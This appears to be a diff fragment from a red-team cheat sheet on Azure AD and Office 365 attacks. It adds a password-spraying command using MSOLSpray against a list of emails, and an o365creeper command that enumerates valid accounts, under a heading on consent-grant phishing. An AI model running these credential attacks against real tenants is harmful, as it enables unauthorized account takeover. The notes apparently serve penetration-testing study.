@@ -13,6 +13,12 @@
 - https://github.com/ustayready/fireprox
 ```
 Import-Module .\MSOLSpray.ps1
+Invoke-MSOLSpray -UserList C:\AzAD\Tools\validemails.txt -Password SuperVeryEasytoGuessPassword@1234 -Verbose
+```
+
+#### Find valid emails
+```
+C:\Python27\python.exe o365creeper.py -f emails.txt -o validemails.txt
 ```
 
 ## Illicit Consent Grant phishing
